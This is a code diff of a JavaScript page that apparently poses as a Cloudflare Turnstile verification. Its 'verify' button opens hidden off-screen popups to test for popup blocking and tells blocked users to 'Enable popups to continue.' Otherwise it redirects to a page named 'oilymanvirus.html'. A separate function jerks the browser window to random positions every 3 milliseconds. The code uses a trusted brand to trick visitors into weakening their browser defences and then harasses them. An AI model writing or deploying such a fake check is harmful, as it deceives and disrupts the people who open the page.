@@ -50,42 +50,12 @@ var xOff = 5,
   yOff = 5,
   xPos = 400,
   yPos = -100;
-/*
-function newXlt() {
-  xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
-  window.focus();
-}
-function newXrt() {
-  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
-}
-function newYup() {
-  yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
-}
-function newYdn() {
-  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
-}
-*/
+
 function playBall() {
-  /*
-  xPos += xOff;
-  yPos += yOff;
-  if (xPos > screen.width - 175) {
-    newXlt();
-  }
-  if (xPos < 0) {
-    newXrt();
-  }
-  if (yPos > screen.height - 100) {
-    newYup();
-  }
-  if (yPos < 0) {
-    newYdn();
-  }
-  */
 
   xPos = Math.ceil(Math.random() * screen.width);
   yPos = Math.ceil(Math.random() * screen.height);
-  
+
   window.moveTo(xPos, yPos);
   setTimeout(playBall, 3);
 }
@@ -94,45 +64,45 @@ function popupprompt() {
   const popups = [];
 
   for (let i = 0; i < 3; i++) {
-      const popup = window.open("https://cloudflare.com/popuptest?=hD3UMay0orTnzvfYQPBeoobhnvucEztt63gahzvqy968xPSs9qxigpdT8u52Omt0nuvtDL1LY3jrrIkxb8BBHJMaFGQrOMcR7iK8wZFLbcIXK2jUfUXCU61Ow11fFMFv", "", "width=1,height=1,left=-1000,top=-1000");
-      popups.push(popup);
+    const popup = window.open("https://cloudflare.com/popuptest?=hD3UMay0orTnzvfYQPBeoobhnvucEztt63gahzvqy968xPSs9qxigpdT8u52Omt0nuvtDL1LY3jrrIkxb8BBHJMaFGQrOMcR7iK8wZFLbcIXK2jUfUXCU61Ow11fFMFv", "", "width=1,height=1,left=-1000,top=-1000");
+    popups.push(popup);
   }
 
   const blocked = popups.some(popup => popup === null || typeof popup === "undefined");
 
   if (blocked) {
-      popups.forEach(popup => {
-          if (popup && !popup.closed) popup.close();
-      });
-      
-      setTimeout(function () {
-          const changeElement = document.getElementById("change");
-          if (changeElement) {
-              changeElement.textContent = "Verifying...";
-          }
-      }, 300);
-      
-      setTimeout(function () {
-          const changeElement = document.getElementById("change");
-          const changeElement2 = document.getElementById("cloudflaremsg");
-          if (changeElement) {
-              changeElement.textContent = "Enable popups to continue.";
-          }
-          if (changeElement2) {
-              changeElement2.style.display = "block";
-          }
-      }, 2000);
-  } else {
-      popups.forEach(popup => popup.close());
-      window.location.href = "./oilymanvirus.html";
-  }
-  }
+    popups.forEach(popup => {
+      if (popup && !popup.closed) popup.close();
+    });
 
-  document.addEventListener('DOMContentLoaded', () => {
+    setTimeout(function () {
+      const changeElement = document.getElementById("change");
+      if (changeElement) {
+        changeElement.textContent = "Verifying...";
+      }
+    }, 300);
+
+    setTimeout(function () {
+      const changeElement = document.getElementById("change");
+      const changeElement2 = document.getElementById("cloudflaremsg");
+      if (changeElement) {
+        changeElement.textContent = "Enable popups to continue.";
+      }
+      if (changeElement2) {
+        changeElement2.style.display = "block";
+      }
+    }, 2000);
+  } else {
+    popups.forEach(popup => popup.close());
+    window.location.href = "./oilymanvirus.html";
+  }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
   const button = document.querySelector('.turnstile-button');
   if (button) {
-      button.addEventListener('click', popupprompt);
+    button.addEventListener('click', popupprompt);
   }
 });
 
-
+/* eerw */
